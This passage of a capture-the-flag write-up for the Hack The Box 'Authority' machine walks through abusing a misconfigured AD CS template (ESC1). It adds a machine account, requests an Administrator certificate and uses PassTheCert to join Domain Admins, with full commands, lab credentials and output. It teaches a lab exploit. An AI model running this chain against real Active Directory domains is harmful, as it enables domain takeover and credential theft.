    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

There's also a python based tool, [certipy](https://github.com/ly4k/Certipy) which can be used to enumerate AD CS remotely.

According to Certipy's output:

- The Enterprise CA is named `AUTHORITY-CA`.
- The DNS Hostname is `authority.authority.htb`.
- The `Certificate Name` Flag is configured as `EnrolleeSuppliesSubject`.
- `Extended Key Usage` contains Client Authentication, which means the generated certificate can be used to authenticate to computers in the AD.
- Manager approval is not required before issuing the cert.
- `Authorized Signatures Required` is set to zero.

As a result, the `CorpVPN` template appears to be vulnerable to `ESC1`.

The same info can be obtained using [Certify](https://github.com/GhostPack/Certify)'s [pre-compiled](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) binary.

```cmd
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> .\Certify.exe find /vulnerable
...snip...
[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
...snip...
[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag           : ENROLLEE_SUPPLIES_SUBJECT
...snip...
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519

Certify completed in 00:00:10.0047510
```

The `ESC1` vulnerability, which involves a misconfigured certificate template, allows users with enrollment rights to specify a SAN ( subjectAltName ). The certificate name flag is associated with the construction of the subject name for an issued certificate. When set to `EnrolleeSuppliesSubject`, it signifies that the user initiating a new certificate request for the said template can specify the certificate for any other user. Exploiting this vulnerability would allow me to obtain certificates for other users, including Domain Admins.

According to the enrolment permissions for the vulnerable certificate, aside from Domain Admins, members of the `Domain Computers` group also have enrolment rights. [Domain Computers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-computers) is a default AD group comprising of all computers in the domain. Enumeration with adPEAS indicated that any authenticated user can add a computer to the domain. Since, the `svc_ldap` user isn't part of the group, exploiting the vulnerable certificate template requires joining the `Domain Computers` group.

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> net group 'Domain Computers'
Group name     Domain Computers
Comment        All workstations and servers joined to the domain

Members

-------------------------------------------------------------------------------
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

The [MachineAccountQuota](https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota) is set to a value greater than 0. This implies that even unprivileged users have the ability to add computers to the domain.

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Get-ADDomain | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'

ms-ds-machineaccountquota
-------------------------
                       10
```

The same information can be obtained remotely using [bloodyAD](https://github.com/CravateRouge/bloodyAD).

```bash
❯ bloodyAD -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d authority.htb --host 10.10.11.222 get object 'DC=authority,DC=htb' --attr ms-DS-MachineAccountQuota

distinguishedName: DC=authority,DC=htb
ms-DS-MachineAccountQuota: 10
```

### Exploit Path

Based on the findings, I can get an Administrator certificate:

- Add a new computer to the domain to gain access to the `Domain Computers` group.
- Authenticate to the newly added computer.
- Request a certificate for Administrator from the vulnerable template using the new computer.
- Utilize PassTheCert to authenticate as Administrator.

![excalidraw-exploit-path](./images/excali-exploit-path.png "Exploit explained")

The [addcomputer.py](https://tools.thehacker.recipes/impacket/examples/addcomputer.py) script from Impacket can be to used to add a new computer account in the domain, using the credentials of a domain user. The input format is `DOMAIN/username:password` followed by the computer name and computer password.

```bash
❯ addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name Abraxas -computer-pass Abraxas

Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Successfully added machine account Abraxas$ with password Abraxas.
```

This can be verified using the `Get-ADComputer` command. The computer `Abraxas$` is present, but comparing it with the `Authority$` computer, it lacks the `DNSHostName` attribute.

```cmd
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Get-ADComputer Abraxas -properties dnshostname,serviceprincipalname

DistinguishedName : CN=Abraxas,CN=Computers,DC=authority,DC=htb
DNSHostName       :
Enabled           : True
Name              : Abraxas
ObjectClass       : computer
ObjectGUID        : d7c3dfee-2cb5-4f28-8afc-38913a60b83d
SamAccountName    : Abraxas$
SID               : S-1-5-21-622327497-3269355298-2248959698-11618
UserPrincipalName :

*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Get-ADComputer Authority -properties dnshostname,serviceprincipalname

DistinguishedName    : CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
DNSHostName          : authority.authority.htb
Enabled              : True
Name                 : AUTHORITY
ObjectClass          : computer
ObjectGUID           : 23c88ddb-c76e-41bd-8b75-dd04e08431cc
SamAccountName       : AUTHORITY$
serviceprincipalname : {HOST/AUTHORITY/htb.corp, ldap/AUTHORITY/ForestDnsZones.authority.htb, GC/AUTHORITY/htb.corp, ldap/AUTHORITY/DomainDnsZones.authority.htb...}
SID                  : S-1-5-21-622327497-3269355298-2248959698-1000
UserPrincipalName    :
```

The `certify-ad` or `certify.exe` tool can be employed to obtain a certificate as `Administrator`. Given that the newly added computer lacks the DNSHostname attribute, it needs to be specified explicitly when requesting a new certificate. Additionally, when specifying the username, it needs to be `Abraxas$` because authenticated and domain-joined accounts have a [`$` sign appended to samAccountName](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/the-mysterious-case-of-the-a-k-a-dollar-sign-character-in-hybrid/ba-p/768326).

Certipy flags include:

- `-target` for specifying the target domain.
- `-ca` for indicating the Certificate Authority Name.
- `-upn` for specifying the target user, preferably a domain admin (Administrator).
- `-dns` for setting the DNS to `authority.authority.htb` (used solely for certificate request).
- `-template` for specifying the template to use (CorpVPN).

> Windows equivalent command ->
> `certify.exe request /ca:<$certificateAuthorityHost> /template:<$vulnerableCertificateTemplateName> /altname:<$adUserToImpersonate>`

```bash
❯ certipy req \
-u 'Abraxas$' -p 'Abraxas' \
-ca 'AUTHORITY-CA' -target authority.htb \
-upn Administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 \
-template CorpVPN
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: Unknown DCE RPC fault status code: 00000721
[-] Use -debug to print a stacktrace
```

It seems that the commands encounter intermittent RPC errors, but the issue is resolved by retrying the command a few times. I'm not entirely sure about the exact reason for this.

```bash
❯ certipy req \
-u 'Abraxas$' -p 'Abraxas' \
-ca 'AUTHORITY-CA' -target authority.htb \
-upn Administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 \
-template CorpVPN
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate with multiple identifications
    UPN: 'Administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

After running the command multiple times, I was able to get a certificate for Administrator.

```bash
❯ certipy cert -pfx certipy/administrator_authority.pfx
Certipy v4.7.0 - by Oliver Lyak (ly4k)

-----BEGIN CERTIFICATE-----
MIIGZDCCBUygAwIBAgITEwAAAANIw05iQpigHQAAAAAAAzANBgkqhkiG9w0BAQsF
ADBHMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJYXV0aG9y
...snip...
...snip...
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC3VxxDWy0NYcqv
I6GJoU2qOnvyFMceyVihlIB6E73PVkA03Xhz0wB0t3IWXFUaS0ZaZAle0Q32QOcj
<--SNIP-->
<--SNIP-->
```

Attempting authentication with the Administrator's certificate results in a DC error: `KDC has no support for padata type`. This suggests that the [KDC lacks configuration for Kerberos authentication with certificates](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d#KDC_ERR_PADATA_TYPE_NOSUPP) or does not have the required Enhanced Key Usages (EKUs).

```cmd
❯ certipy auth -pfx administrator_authority.pfx
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@authority.htb'
    [1] DNS Host Name: 'authority.authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Attempting to obtain the Administrator's TGT with Rubeus results in a similar error.

```cmd
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:administrator_authority.pfx /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Abraxas$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'authority.htb\Administrator'
[*] Using domain controller: fe80::8856:b0bf:b6f3:1fad%8:88

[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN

*Evil-WinRM* PS C:\Users\svc_ldap\Documents>

```

I came across another blog mentioning [CVE-2022-26923](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html), which relied on RBCD. Despite bloodyAD indicating that `Abraxas$` could impersonate Authority, I wasn't able to get a ticket for impersonating Administrator. I'm not entirely certain about the reason for this, but I suspect it might be a false positive.

```bash
❯ openssl pkcs12 -in administrator_authority.pfx  -out administrator_authority.pem -nodes
Enter Import Password:

❯ bloodyAD -s -u 'Abraxas$' -d authority.htb -c ':administrator_authority.pem' --host 10.10.11.222 add rbcd 'AUTHORITY$' 'ABRAXAS$'
[+] ABRAXAS$ can now impersonate users on AUTHORITY$ via S4U2Proxy

❯ _ rdate -n 10.10.11.222
Mon Aug  7 16:58:57 IST 2023

❯ getST.py -spn ldap/authority.htb -impersonate Administrator -dc-ip 10.10.11.222 'authority.htb/Abraxas$:Abraxas'
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Probably user Abraxas$ does not have constrained delegation permissions or impersonated user does not exist
```### PassTheCert Attack

The remaining step involves attempting the PassTheCert attack, and I found an informative blog post [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html). It can be used to:

- Elevate privileges, granting the user DCSync privileges.
- Modify the password for a certain user.
- Get a LDAP shell. With an admin certificate, I can also add an user to the domain admin group

For this attack the certificate and the private keys need to be separate. Certipy's cert sub-command makes this process straightforward.

```bash
❯ certipy cert -pfx administrator_authority.pfx -nokey -out admin.crt
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'admin.crt'

❯ certipy cert -pfx administrator_authority.pfx -nocert -out admin.key
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing private key to 'admin.key'
```

Utilizing the [Python script from AlmondOffSec](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python), I was able to get an interactive LDAP shell. Given that the certificate belongs to Administrator, I can add the `svc_ldap` user to the `Domain Admins` group using the `add_user_to_group` command. Since this script uses Impacket under the hood, I can also add a new computer using the `add_computer` command within the script.

```bash
❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -action ldap-shell -port 636
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK

# exit
```

Seems `svc_ldap` is now a part of the `Domain Admins` group, and hence have admin privileges.

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Domain Admins                      Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
...snip...
...snip...
```

```powershell
*Evil-WinRM* PS C:\Users> ls "C:/Users/Administrator/Desktop/"


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/6/2023  11:20 PM             34 root.txt


*Evil-WinRM* PS C:\Users> cat "C:/Users/Administrator/Desktop/root.txt"
40522df19c024877ca5dc612219fc9fd
```

Alternatively, using the same script I can also change Administrator's password.

```bash
❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -target svc_ldap -new-pass
```

Another option is to grant `svc_ldap` DCSync rights and use `secretsdump.py` to dump the hashes.

```bash
❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -target svc_ldap -elevate
```

**Pwned!**

<!-- ![Pwned](./images/Pwned.png) -->

---

# Related Links

- [GhostPack/Certify: Active Directory certificate abuse.](https://github.com/GhostPack/Certify)
- [r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0)](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse](https://github.com/ly4k/Certipy)
- [addcomputer.py - The Hacker Tools](https://tools.thehacker.recipes/impacket/examples/addcomputer.py)
- [Certified Pre-Owned. Active Directory Certificate Services… | by Will Schroeder | Posts By SpecterOps Team Members](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certificates and Pwnage and Patches, Oh My! | by Will Schroeder | Posts By SpecterOps Team Members](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
- [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
- [Help understanding limitations of "KDC_ERR_PADATA_TYPE_NBSP" · Issue #64 · ly4k/Certipy](https://github.com/ly4k/Certipy/issues/64)
- [bloodyAD and Certifried (CVE-2022-26923) | Total Recall](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
- [From Misconfigured Certificate Template to Domain Admin - Red Team Notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
- [dirkjanm/PKINITtools: Tools for Kerberos PKINIT and relaying to AD CS](https://github.com/dirkjanm/PKINITtools/)
- [4771(F) Kerberos pre-authentication failed. - Windows Security | Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)
- [Charlie Bromberg: Kerberos basics & (ab)use of Certificates within Active Directory (i.e. AD CS and PKINIT) - Kerberos 101 - Pass-the-Certificate - UnPAC-the-Hash - Shadow Credentials - AD CS escalation (ESC1 to ESC8)](https://twitter.com/_nwodtuhs/status/1451510341041594377)
- [Authenticating with certificates when PKINIT is not supported - Almond Offensive Security Blog](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
